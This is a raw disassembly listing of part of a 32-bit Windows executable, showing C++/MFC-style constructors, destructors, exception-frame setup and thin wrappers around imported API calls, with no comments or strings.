  40167a:	83 c4 04             	add    $0x4,%esp
  40167d:	c3                   	ret
  40167e:	90                   	nop
  40167f:	90                   	nop
  401680:	b9 60 ce 42 00       	mov    $0x42ce60,%ecx
  401685:	e9 b6 ff ff ff       	jmp    0x401640
  40168a:	90                   	nop
  40168b:	90                   	nop
  40168c:	90                   	nop
  40168d:	90                   	nop
  40168e:	90                   	nop
  40168f:	90                   	nop
  401690:	6a ff                	push   $0xffffffff
  401692:	68 42 06 42 00       	push   $0x420642
  401697:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40169d:	50                   	push   %eax
  40169e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4016a5:	83 ec 28             	sub    $0x28,%esp
  4016a8:	56                   	push   %esi
  4016a9:	8b f1                	mov    %ecx,%esi
  4016ab:	e8 24 d5 01 00       	call   0x41ebd4
  4016b0:	68 f0 91 42 00       	push   $0x4291f0
  4016b5:	8b ce                	mov    %esi,%ecx
  4016b7:	e8 88 d2 01 00       	call   0x41e944
  4016bc:	6a 04                	push   $0x4
  4016be:	8b ce                	mov    %esi,%ecx
  4016c0:	e8 8f c9 01 00       	call   0x41e054
  4016c5:	6a 68                	push   $0x68
  4016c7:	e8 90 ef 00 00       	call   0x41065c
  4016cc:	83 c4 04             	add    $0x4,%esp
  4016cf:	89 44 24 04          	mov    %eax,0x4(%esp)
  4016d3:	85 c0                	test   %eax,%eax
  4016d5:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4016dc:	00 
  4016dd:	74 1d                	je     0x4016fc
  4016df:	68 68 25 42 00       	push   $0x422568
  4016e4:	68 00 20 42 00       	push   $0x422000
  4016e9:	68 78 24 42 00       	push   $0x422478
  4016ee:	68 80 00 00 00       	push   $0x80
  4016f3:	8b c8                	mov    %eax,%ecx
  4016f5:	e8 10 67 01 00       	call   0x417e0a
  4016fa:	eb 02                	jmp    0x4016fe
  4016fc:	33 c0                	xor    %eax,%eax
  4016fe:	50                   	push   %eax
  4016ff:	8b ce                	mov    %esi,%ecx
  401701:	c7 44 24 38 ff ff ff 	movl   $0xffffffff,0x38(%esp)
  401708:	ff 
  401709:	e8 70 94 01 00       	call   0x41ab7e
  40170e:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401712:	e8 17 ca 01 00       	call   0x41e12e
  401717:	8d 44 24 08          	lea    0x8(%esp),%eax
  40171b:	8b ce                	mov    %esi,%ecx
  40171d:	50                   	push   %eax
  40171e:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  401725:	00 
  401726:	e8 a5 c9 01 00       	call   0x41e0d0
  40172b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40172f:	51                   	push   %ecx
  401730:	8b ce                	mov    %esi,%ecx
  401732:	e8 a9 ce 01 00       	call   0x41e5e0
  401737:	85 c0                	test   %eax,%eax
  401739:	75 23                	jne    0x40175e
  40173b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40173f:	c7 44 24 34 ff ff ff 	movl   $0xffffffff,0x34(%esp)
  401746:	ff 
  401747:	e8 6d ca 01 00       	call   0x41e1b9
  40174c:	33 c0                	xor    %eax,%eax
  40174e:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401752:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401759:	5e                   	pop    %esi
  40175a:	83 c4 34             	add    $0x34,%esp
  40175d:	c3                   	ret
  40175e:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  401761:	6a 05                	push   $0x5
  401763:	e8 9f 26 01 00       	call   0x413e07
  401768:	8b 56 1c             	mov    0x1c(%esi),%edx
  40176b:	8b 42 1c             	mov    0x1c(%edx),%eax
  40176e:	50                   	push   %eax
  40176f:	ff 15 64 1a 43 00    	call   *0x431a64
  401775:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401779:	c7 44 24 34 ff ff ff 	movl   $0xffffffff,0x34(%esp)
  401780:	ff 
  401781:	e8 33 ca 01 00       	call   0x41e1b9
  401786:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40178a:	b8 01 00 00 00       	mov    $0x1,%eax
  40178f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401796:	5e                   	pop    %esi
  401797:	83 c4 34             	add    $0x34,%esp
  40179a:	c3                   	ret
  40179b:	90                   	nop
  40179c:	90                   	nop
  40179d:	90                   	nop
  40179e:	90                   	nop
  40179f:	90                   	nop
  4017a0:	56                   	push   %esi
  4017a1:	6a 00                	push   $0x0
  4017a3:	8b f1                	mov    %ecx,%esi
  4017a5:	6a 64                	push   $0x64
  4017a7:	e8 df f2 00 00       	call   0x410a8b
  4017ac:	c7 06 a0 23 42 00    	movl   $0x4223a0,(%esi)
  4017b2:	8b c6                	mov    %esi,%eax
  4017b4:	5e                   	pop    %esi
  4017b5:	c3                   	ret
  4017b6:	90                   	nop
  4017b7:	90                   	nop
  4017b8:	90                   	nop
  4017b9:	90                   	nop
  4017ba:	90                   	nop
  4017bb:	90                   	nop
  4017bc:	90                   	nop
  4017bd:	90                   	nop
  4017be:	90                   	nop
  4017bf:	90                   	nop
  4017c0:	56                   	push   %esi
  4017c1:	8b f1                	mov    %ecx,%esi
  4017c3:	e8 18 00 00 00       	call   0x4017e0
  4017c8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4017cd:	74 09                	je     0x4017d8
  4017cf:	56                   	push   %esi
  4017d0:	e8 c3 ee 00 00       	call   0x410698
  4017d5:	83 c4 04             	add    $0x4,%esp
  4017d8:	8b c6                	mov    %esi,%eax
  4017da:	5e                   	pop    %esi
  4017db:	c2 04 00             	ret    $0x4
  4017de:	90                   	nop
  4017df:	90                   	nop
  4017e0:	e9 38 f0 00 00       	jmp    0x41081d
  4017e5:	90                   	nop
  4017e6:	90                   	nop
  4017e7:	90                   	nop
  4017e8:	90                   	nop
  4017e9:	90                   	nop
  4017ea:	90                   	nop
  4017eb:	90                   	nop
  4017ec:	90                   	nop
  4017ed:	90                   	nop
  4017ee:	90                   	nop
  4017ef:	90                   	nop
  4017f0:	b8 d8 22 42 00       	mov    $0x4222d8,%eax
  4017f5:	c3                   	ret
  4017f6:	90                   	nop
  4017f7:	90                   	nop
  4017f8:	90                   	nop
  4017f9:	90                   	nop
  4017fa:	90                   	nop
  4017fb:	90                   	nop
  4017fc:	90                   	nop
  4017fd:	90                   	nop
  4017fe:	90                   	nop
  4017ff:	90                   	nop
  401800:	6a ff                	push   $0xffffffff
  401802:	68 58 06 42 00       	push   $0x420658
  401807:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40180d:	50                   	push   %eax
  40180e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401815:	83 ec 5c             	sub    $0x5c,%esp
  401818:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  40181c:	e8 7f ff ff ff       	call   0x4017a0
  401821:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  401825:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%esp)
  40182c:	00 
  40182d:	e8 07 f3 00 00       	call   0x410b39
  401832:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  401836:	c7 44 24 64 ff ff ff 	movl   $0xffffffff,0x64(%esp)
  40183d:	ff 
  40183e:	e8 da ef 00 00       	call   0x41081d
  401843:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  401847:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40184e:	83 c4 68             	add    $0x68,%esp
  401851:	c3                   	ret
  401852:	90                   	nop
  401853:	90                   	nop
  401854:	90                   	nop
  401855:	90                   	nop
  401856:	90                   	nop
  401857:	90                   	nop
  401858:	90                   	nop
  401859:	90                   	nop
  40185a:	90                   	nop
  40185b:	90                   	nop
  40185c:	90                   	nop
  40185d:	90                   	nop
  40185e:	90                   	nop
  40185f:	90                   	nop
  401860:	8b 41 1c             	mov    0x1c(%ecx),%eax
  401863:	6a 00                	push   $0x0
  401865:	50                   	push   %eax
  401866:	ff 15 60 1a 43 00    	call   *0x431a60
  40186c:	c3                   	ret
  40186d:	90                   	nop
  40186e:	90                   	nop
  40186f:	90                   	nop
  401870:	8b 41 1c             	mov    0x1c(%ecx),%eax
  401873:	6a 01                	push   $0x1
  401875:	50                   	push   %eax
  401876:	ff 15 60 1a 43 00    	call   *0x431a60
  40187c:	c3                   	ret
  40187d:	90                   	nop
  40187e:	90                   	nop
  40187f:	90                   	nop
  401880:	6a ff                	push   $0xffffffff
  401882:	68 7a 06 42 00       	push   $0x42067a
  401887:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40188d:	50                   	push   %eax
  40188e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401895:	51                   	push   %ecx
  401896:	6a 50                	push   $0x50
  401898:	e8 bf ed 00 00       	call   0x41065c
  40189d:	83 c4 04             	add    $0x4,%esp
  4018a0:	89 44 24 00          	mov    %eax,0x0(%esp)
  4018a4:	85 c0                	test   %eax,%eax
  4018a6:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4018ad:	00 
  4018ae:	74 16                	je     0x4018c6
  4018b0:	8b c8                	mov    %eax,%ecx
  4018b2:	e8 49 00 00 00       	call   0x401900
  4018b7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4018bb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4018c2:	83 c4 10             	add    $0x10,%esp
  4018c5:	c3                   	ret
  4018c6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4018ca:	33 c0                	xor    %eax,%eax
  4018cc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4018d3:	83 c4 10             	add    $0x10,%esp
  4018d6:	c3                   	ret
  4018d7:	90                   	nop
  4018d8:	90                   	nop
  4018d9:	90                   	nop
  4018da:	90                   	nop
  4018db:	90                   	nop
  4018dc:	90                   	nop
  4018dd:	90                   	nop
  4018de:	90                   	nop
  4018df:	90                   	nop
  4018e0:	b8 78 24 42 00       	mov    $0x422478,%eax
  4018e5:	c3                   	ret
  4018e6:	90                   	nop
  4018e7:	90                   	nop
  4018e8:	90                   	nop
  4018e9:	90                   	nop
  4018ea:	90                   	nop
  4018eb:	90                   	nop
  4018ec:	90                   	nop
  4018ed:	90                   	nop
  4018ee:	90                   	nop
  4018ef:	90                   	nop
  4018f0:	b8 90 24 42 00       	mov    $0x422490,%eax
  4018f5:	c3                   	ret
  4018f6:	90                   	nop
  4018f7:	90                   	nop
  4018f8:	90                   	nop
  4018f9:	90                   	nop
  4018fa:	90                   	nop
  4018fb:	90                   	nop
  4018fc:	90                   	nop
  4018fd:	90                   	nop
  4018fe:	90                   	nop
  4018ff:	90                   	nop
  401900:	56                   	push   %esi
  401901:	8b f1                	mov    %ecx,%esi
  401903:	e8 b0 67 01 00       	call   0x4180b8
  401908:	c7 06 b0 24 42 00    	movl   $0x4224b0,(%esi)
  40190e:	8b c6                	mov    %esi,%eax
  401910:	5e                   	pop    %esi
  401911:	c3                   	ret
  401912:	90                   	nop
  401913:	90                   	nop
  401914:	90                   	nop
  401915:	90                   	nop
  401916:	90                   	nop
  401917:	90                   	nop
  401918:	90                   	nop
  401919:	90                   	nop
  40191a:	90                   	nop
  40191b:	90                   	nop
  40191c:	90                   	nop
  40191d:	90                   	nop
  40191e:	90                   	nop
  40191f:	90                   	nop
  401920:	56                   	push   %esi
  401921:	8b f1                	mov    %ecx,%esi
  401923:	e8 18 00 00 00       	call   0x401940
  401928:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40192d:	74 09                	je     0x401938
  40192f:	56                   	push   %esi
  401930:	e8 63 ed 00 00       	call   0x410698
  401935:	83 c4 04             	add    $0x4,%esp
  401938:	8b c6                	mov    %esi,%eax
  40193a:	5e                   	pop    %esi
  40193b:	c2 04 00             	ret    $0x4
  40193e:	90                   	nop
  40193f:	90                   	nop
  401940:	c7 01 b0 24 42 00    	movl   $0x4224b0,(%ecx)
  401946:	e9 ed 67 01 00       	jmp    0x418138
  40194b:	90                   	nop
  40194c:	90                   	nop
  40194d:	90                   	nop
  40194e:	90                   	nop
  40194f:	90                   	nop
  401950:	e8 18 72 01 00       	call   0x418b6d
  401955:	f7 d8                	neg    %eax
  401957:	1b c0                	sbb    %eax,%eax
  401959:	f7 d8                	neg    %eax
  40195b:	c3                   	ret
  40195c:	90                   	nop
  40195d:	90                   	nop
  40195e:	90                   	nop
  40195f:	90                   	nop
  401960:	c2 04 00             	ret    $0x4
  401963:	90                   	nop
  401964:	90                   	nop
  401965:	90                   	nop
  401966:	90                   	nop
  401967:	90                   	nop
  401968:	90                   	nop
  401969:	90                   	nop
  40196a:	90                   	nop
  40196b:	90                   	nop
  40196c:	90                   	nop
  40196d:	90                   	nop
  40196e:	90                   	nop
  40196f:	90                   	nop
  401970:	8b 41 44             	mov    0x44(%ecx),%eax
  401973:	c3                   	ret
  401974:	90                   	nop
  401975:	90                   	nop
  401976:	90                   	nop
  401977:	90                   	nop
  401978:	90                   	nop
  401979:	90                   	nop
  40197a:	90                   	nop
  40197b:	90                   	nop
  40197c:	90                   	nop
  40197d:	90                   	nop
  40197e:	90                   	nop
  40197f:	90                   	nop
  401980:	8b 44 24 04          	mov    0x4(%esp),%eax
  401984:	89 41 44             	mov    %eax,0x44(%ecx)
  401987:	c2 04 00             	ret    $0x4
  40198a:	90                   	nop
  40198b:	90                   	nop
  40198c:	90                   	nop
  40198d:	90                   	nop
  40198e:	90                   	nop
  40198f:	90                   	nop
  401990:	6a ff                	push   $0xffffffff
  401992:	68 9a 06 42 00       	push   $0x42069a
  401997:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40199d:	50                   	push   %eax
  40199e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4019a5:	51                   	push   %ecx
  4019a6:	6a 40                	push   $0x40
  4019a8:	e8 af ec 00 00       	call   0x41065c
  4019ad:	83 c4 04             	add    $0x4,%esp
  4019b0:	89 44 24 00          	mov    %eax,0x0(%esp)
  4019b4:	85 c0                	test   %eax,%eax
  4019b6:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4019bd:	00 
  4019be:	74 16                	je     0x4019d6
  4019c0:	8b c8                	mov    %eax,%ecx
  4019c2:	e8 49 00 00 00       	call   0x401a10
  4019c7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4019cb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4019d2:	83 c4 10             	add    $0x10,%esp
  4019d5:	c3                   	ret
  4019d6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4019da:	33 c0                	xor    %eax,%eax
  4019dc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4019e3:	83 c4 10             	add    $0x10,%esp
  4019e6:	c3                   	ret
  4019e7:	90                   	nop
  4019e8:	90                   	nop
  4019e9:	90                   	nop
  4019ea:	90                   	nop
  4019eb:	90                   	nop
  4019ec:	90                   	nop
  4019ed:	90                   	nop
  4019ee:	90                   	nop
  4019ef:	90                   	nop
  4019f0:	b8 68 25 42 00       	mov    $0x422568,%eax
  4019f5:	c3                   	ret
  4019f6:	90                   	nop
  4019f7:	90                   	nop
  4019f8:	90                   	nop
  4019f9:	90                   	nop
  4019fa:	90                   	nop
  4019fb:	90                   	nop
  4019fc:	90                   	nop
  4019fd:	90                   	nop
  4019fe:	90                   	nop
  4019ff:	90                   	nop
  401a00:	b8 80 25 42 00       	mov    $0x422580,%eax
  401a05:	c3                   	ret
  401a06:	90                   	nop
  401a07:	90                   	nop
  401a08:	90                   	nop
  401a09:	90                   	nop
  401a0a:	90                   	nop
  401a0b:	90                   	nop
  401a0c:	90                   	nop
  401a0d:	90                   	nop
  401a0e:	90                   	nop
  401a0f:	90                   	nop
  401a10:	56                   	push   %esi
  401a11:	8b f1                	mov    %ecx,%esi
  401a13:	e8 f5 75 01 00       	call   0x41900d
  401a18:	c7 06 a0 25 42 00    	movl   $0x4225a0,(%esi)
  401a1e:	8b c6                	mov    %esi,%eax
  401a20:	5e                   	pop    %esi
  401a21:	c3                   	ret
  401a22:	90                   	nop
  401a23:	90                   	nop
  401a24:	90                   	nop
  401a25:	90                   	nop
  401a26:	90                   	nop
  401a27:	90                   	nop
  401a28:	90                   	nop
  401a29:	90                   	nop
  401a2a:	90                   	nop
  401a2b:	90                   	nop
  401a2c:	90                   	nop
  401a2d:	90                   	nop
  401a2e:	90                   	nop
  401a2f:	90                   	nop
  401a30:	56                   	push   %esi
  401a31:	8b f1                	mov    %ecx,%esi
  401a33:	e8 18 00 00 00       	call   0x401a50
  401a38:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401a3d:	74 09                	je     0x401a48
  401a3f:	56                   	push   %esi
  401a40:	e8 53 ec 00 00       	call   0x410698
  401a45:	83 c4 04             	add    $0x4,%esp
  401a48:	8b c6                	mov    %esi,%eax
  401a4a:	5e                   	pop    %esi
  401a4b:	c2 04 00             	ret    $0x4
  401a4e:	90                   	nop
  401a4f:	90                   	nop
  401a50:	c7 01 a0 25 42 00    	movl   $0x4225a0,(%ecx)
  401a56:	e9 e4 75 01 00       	jmp    0x41903f
  401a5b:	90                   	nop
  401a5c:	90                   	nop
  401a5d:	90                   	nop
  401a5e:	90                   	nop
  401a5f:	90                   	nop
  401a60:	8b 44 24 04          	mov    0x4(%esp),%eax
  401a64:	50                   	push   %eax
  401a65:	e8 15 76 01 00       	call   0x41907f
  401a6a:	c2 04 00             	ret    $0x4
  401a6d:	90                   	nop
  401a6e:	90                   	nop
  401a6f:	90                   	nop
  401a70:	b8 05 07 42 00       	mov    $0x420705,%eax
  401a75:	e8 76 0e 00 00       	call   0x4028f0
  401a7a:	51                   	push   %ecx
  401a7b:	68 84 00 00 00       	push   $0x84
  401a80:	e8 6a d2 01 00       	call   0x41ecef
  401a85:	8b c8                	mov    %eax,%ecx
  401a87:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401a8a:	33 c0                	xor    %eax,%eax
  401a8c:	3b c8                	cmp    %eax,%ecx
  401a8e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a91:	74 05                	je     0x401a98
  401a93:	e8 5e d9 01 00       	call   0x41f3f6
  401a98:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401a9b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401aa2:	c9                   	leave
  401aa3:	c3                   	ret
  401aa4:	e8 e4 2b 01 00       	call   0x41468d
  401aa9:	85 c0                	test   %eax,%eax
  401aab:	74 0d                	je     0x401aba
  401aad:	e8 db 2b 01 00       	call   0x41468d
  401ab2:	8b 10                	mov    (%eax),%edx
  401ab4:	8b c8                	mov    %eax,%ecx
  401ab6:	ff 52 7c             	call   *0x7c(%edx)
  401ab9:	c3                   	ret
  401aba:	33 c0                	xor    %eax,%eax
  401abc:	c3                   	ret
  401abd:	8b 01                	mov    (%ecx),%eax
  401abf:	ff a0 d0 00 00 00    	jmp    *0xd0(%eax)
  401ac5:	8b 01                	mov    (%ecx),%eax
  401ac7:	ff a0 cc 00 00 00    	jmp    *0xcc(%eax)
  401acd:	b8 e5 07 42 00       	mov    $0x4207e5,%eax
  401ad2:	e8 19 0e 00 00       	call   0x4028f0
  401ad7:	51                   	push   %ecx
  401ad8:	6a 10                	push   $0x10
  401ada:	e8 10 d2 01 00       	call   0x41ecef
  401adf:	8b c8                	mov    %eax,%ecx
  401ae1:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401ae4:	33 c0                	xor    %eax,%eax
  401ae6:	3b c8                	cmp    %eax,%ecx
  401ae8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401aeb:	74 05                	je     0x401af2
  401aed:	e8 f4 c3 01 00       	call   0x41dee6
  401af2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401af5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401afc:	c9                   	leave
  401afd:	c3                   	ret
  401afe:	b8 f9 07 42 00       	mov    $0x4207f9,%eax
  401b03:	e8 e8 0d 00 00       	call   0x4028f0
  401b08:	51                   	push   %ecx
  401b09:	68 18 01 00 00       	push   $0x118
  401b0e:	e8 dc d1 01 00       	call   0x41ecef
  401b13:	8b c8                	mov    %eax,%ecx
  401b15:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401b18:	33 c0                	xor    %eax,%eax
  401b1a:	3b c8                	cmp    %eax,%ecx
  401b1c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b1f:	74 05                	je     0x401b26
  401b21:	e8 bc d6 01 00       	call   0x41f1e2
  401b26:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401b29:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401b30:	c9                   	leave
  401b31:	c3                   	ret
  401b32:	8b 41 20             	mov    0x20(%ecx),%eax
  401b35:	85 c0                	test   %eax,%eax
  401b37:	75 09                	jne    0x401b42
  401b39:	ff 71 1c             	push   0x1c(%ecx)
  401b3c:	ff 15 18 1a 43 00    	call   *0x431a18
  401b42:	50                   	push   %eax
  401b43:	e8 3d f8 00 00       	call   0x411385
  401b48:	c3                   	ret
  401b49:	e8 93 da 01 00       	call   0x41f5e1
  401b4e:	8b 48 04             	mov    0x4(%eax),%ecx
  401b51:	e9 9d 26 01 00       	jmp    0x4141f3
  401b56:	6a 30                	push   $0x30
  401b58:	e8 92 d1 01 00       	call   0x41ecef
  401b5d:	85 c0                	test   %eax,%eax
  401b5f:	74 07                	je     0x401b68
  401b61:	c7 00 a4 32 42 00    	movl   $0x4232a4,(%eax)
  401b67:	c3                   	ret
  401b68:	33 c0                	xor    %eax,%eax
  401b6a:	c3                   	ret
  401b6b:	56                   	push   %esi
  401b6c:	8b f1                	mov    %ecx,%esi
  401b6e:	e8 93 dc 01 00       	call   0x41f806
  401b73:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401b78:	74 06                	je     0x401b80
  401b7a:	56                   	push   %esi
  401b7b:	e8 8d d1 01 00       	call   0x41ed0d
  401b80:	8b c6                	mov    %esi,%eax
  401b82:	5e                   	pop    %esi
  401b83:	c2 04 00             	ret    $0x4
  401b86:	f6 44 24 04 01       	testb  $0x1,0x4(%esp)
  401b8b:	56                   	push   %esi
  401b8c:	8b f1                	mov    %ecx,%esi
  401b8e:	c7 06 14 34 42 00    	movl   $0x423414,(%esi)
  401b94:	74 07                	je     0x401b9d
  401b96:	56                   	push   %esi
  401b97:	e8 fc ea 00 00       	call   0x410698
  401b9c:	59                   	pop    %ecx
  401b9d:	8b c6                	mov    %esi,%eax
  401b9f:	5e                   	pop    %esi
  401ba0:	c2 04 00             	ret    $0x4
  401ba3:	56                   	push   %esi
  401ba4:	8b f1                	mov    %ecx,%esi
  401ba6:	ff 74 24 08          	push   0x8(%esp)
  401baa:	e8 42 3a 01 00       	call   0x4155f1
  401baf:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401bb3:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  401bb7:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401bbb:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  401bc1:	c7 06 24 37 42 00    	movl   $0x423724,(%esi)
  401bc7:	8b c6                	mov    %esi,%eax
  401bc9:	5e                   	pop    %esi
  401bca:	c2 08 00             	ret    $0x8
  401bcd:	c7 01 14 34 42 00    	movl   $0x423414,(%ecx)
  401bd3:	c3                   	ret
  401bd4:	56                   	push   %esi
  401bd5:	8b f1                	mov    %ecx,%esi
  401bd7:	ff 74 24 08          	push   0x8(%esp)
  401bdb:	e8 11 3a 01 00       	call   0x4155f1
  401be0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401be4:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  401be8:	83 66 10 00          	andl   $0x0,0x10(%esi)
  401bec:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  401bf2:	c7 06 44 37 42 00    	movl   $0x423744,(%esi)
  401bf8:	8b c6                	mov    %esi,%eax
  401bfa:	5e                   	pop    %esi
  401bfb:	c2 08 00             	ret    $0x8
  401bfe:	56                   	push   %esi
  401bff:	8b f1                	mov    %ecx,%esi
  401c01:	e8 14 00 00 00       	call   0x401c1a
  401c06:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401c0b:	74 07                	je     0x401c14
  401c0d:	56                   	push   %esi
  401c0e:	e8 85 ea 00 00       	call   0x410698
  401c13:	59                   	pop    %ecx
  401c14:	8b c6                	mov    %esi,%eax
  401c16:	5e                   	pop    %esi
  401c17:	c2 04 00             	ret    $0x4
  401c1a:	b8 24 09 42 00       	mov    $0x420924,%eax
  401c1f:	e8 cc 0c 00 00       	call   0x4028f0
  401c24:	51                   	push   %ecx
  401c25:	56                   	push   %esi
  401c26:	8b f1                	mov    %ecx,%esi
  401c28:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401c2b:	c7 06 0c 37 42 00    	movl   $0x42370c,(%esi)
  401c31:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401c35:	e8 8c 61 01 00       	call   0x417dc6
  401c3a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401c3d:	c7 06 14 34 42 00    	movl   $0x423414,(%esi)
  401c43:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401c4a:	5e                   	pop    %esi
  401c4b:	c9                   	leave
  401c4c:	c3                   	ret
  401c4d:	ff 74 24 08          	push   0x8(%esp)
  401c51:	ff 74 24 08          	push   0x8(%esp)
  401c55:	ff 71 04             	push   0x4(%ecx)
  401c58:	ff 15 88 16 43 00    	call   *0x431688
  401c5e:	c2 08 00             	ret    $0x8
  401c61:	ff 74 24 04          	push   0x4(%esp)
  401c65:	ff 71 04             	push   0x4(%ecx)
  401c68:	ff 15 8c 16 43 00    	call   *0x43168c
  401c6e:	c2 04 00             	ret    $0x4
  401c71:	ff 74 24 10          	push   0x10(%esp)
  401c75:	ff 74 24 10          	push   0x10(%esp)
  401c79:	ff 74 24 10          	push   0x10(%esp)
  401c7d:	ff 74 24 10          	push   0x10(%esp)
  401c81:	ff 71 04             	push   0x4(%ecx)
  401c84:	ff 15 90 16 43 00    	call   *0x431690
  401c8a:	c2 10 00             	ret    $0x10
  401c8d:	55                   	push   %ebp
  401c8e:	8b ec                	mov    %esp,%ebp
  401c90:	ff 75 20             	push   0x20(%ebp)
  401c93:	ff 75 1c             	push   0x1c(%ebp)
  401c96:	ff 75 18             	push   0x18(%ebp)
  401c99:	ff 75 14             	push   0x14(%ebp)
  401c9c:	ff 75 10             	push   0x10(%ebp)
  401c9f:	ff 75 0c             	push   0xc(%ebp)
  401ca2:	ff 75 08             	push   0x8(%ebp)
  401ca5:	ff 71 04             	push   0x4(%ecx)
  401ca8:	ff 15 94 16 43 00    	call   *0x431694
  401cae:	5d                   	pop    %ebp
  401caf:	c2 1c 00             	ret    $0x1c
  401cb2:	55                   	push   %ebp
  401cb3:	8b ec                	mov    %esp,%ebp
  401cb5:	ff 75 24             	push   0x24(%ebp)
  401cb8:	ff 75 20             	push   0x20(%ebp)
  401cbb:	ff 75 1c             	push   0x1c(%ebp)
  401cbe:	ff 75 18             	push   0x18(%ebp)
  401cc1:	ff 75 14             	push   0x14(%ebp)
  401cc4:	ff 75 10             	push   0x10(%ebp)
  401cc7:	ff 75 0c             	push   0xc(%ebp)
  401cca:	ff 71 04             	push   0x4(%ecx)
  401ccd:	ff 15 d4 18 43 00    	call   *0x4318d4
  401cd3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401cd6:	0f bf d0             	movswl %ax,%edx
  401cd9:	c1 e8 10             	shr    $0x10,%eax
  401cdc:	0f bf c0             	movswl %ax,%eax
  401cdf:	89 41 04             	mov    %eax,0x4(%ecx)
  401ce2:	89 11                	mov    %edx,(%ecx)
  401ce4:	8b c1                	mov    %ecx,%eax
  401ce6:	5d                   	pop    %ebp
  401ce7:	c2 20 00             	ret    $0x20
  401cea:	ff 74 24 10          	push   0x10(%esp)
  401cee:	ff 74 24 10          	push   0x10(%esp)
  401cf2:	ff 74 24 10          	push   0x10(%esp)
  401cf6:	ff 74 24 10          	push   0x10(%esp)
  401cfa:	ff 71 04             	push   0x4(%ecx)
  401cfd:	ff 15 d8 18 43 00    	call   *0x4318d8
  401d03:	c2 10 00             	ret    $0x10
  401d06:	55                   	push   %ebp
  401d07:	8b ec                	mov    %esp,%ebp
  401d09:	8b 45 08             	mov    0x8(%ebp),%eax
  401d0c:	85 c0                	test   %eax,%eax
  401d0e:	74 03                	je     0x401d13
  401d10:	8b 40 04             	mov    0x4(%eax),%eax
  401d13:	ff 75 24             	push   0x24(%ebp)
  401d16:	ff 75 20             	push   0x20(%ebp)
  401d19:	ff 75 1c             	push   0x1c(%ebp)
  401d1c:	ff 75 18             	push   0x18(%ebp)
  401d1f:	ff 75 14             	push   0x14(%ebp)
  401d22:	ff 75 10             	push   0x10(%ebp)
  401d25:	ff 75 0c             	push   0xc(%ebp)
  401d28:	50                   	push   %eax
  401d29:	ff 71 04             	push   0x4(%ecx)
  401d2c:	ff 15 dc 18 43 00    	call   *0x4318dc
  401d32:	5d                   	pop    %ebp
  401d33:	c2 20 00             	ret    $0x20
  401d36:	ff 74 24 10          	push   0x10(%esp)
  401d3a:	ff 74 24 10          	push   0x10(%esp)
  401d3e:	ff 74 24 10          	push   0x10(%esp)
  401d42:	ff 74 24 10          	push   0x10(%esp)
  401d46:	ff 71 04             	push   0x4(%ecx)
  401d49:	ff 15 98 16 43 00    	call   *0x431698
  401d4f:	c2 10 00             	ret    $0x10
  401d52:	c7 01 34 38 42 00    	movl   $0x423834,(%ecx)
  401d58:	c3                   	ret
  401d59:	f6 44 24 04 01       	testb  $0x1,0x4(%esp)
